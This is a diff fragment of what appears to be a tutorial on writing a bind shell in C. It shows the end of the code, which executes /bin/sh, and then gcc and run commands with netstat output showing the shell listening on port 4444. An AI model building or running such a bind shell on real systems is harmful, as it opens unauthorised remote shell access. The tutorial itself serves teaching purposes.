@@ -99,3 +99,12 @@ So lets get some code going!
       // Execute a shell
       execve("/bin/sh", NULL, NULL);
     };
+
+Compiling this code with `gcc bindshell.c -o bindshell` gives us a nice
+executable. Running the executable with `./bindshell` and then looking
+at our network using `netstat -antp` yields something very interesting&#x2026;
+
+    root@blahblah:~# netstat -atp
+    Active Internet connections (servers and established)
+    Proto Local Address Foreign Address State   PID/Program name
+    tcp   *:4444        *:*             LISTEN  1657/bindshell
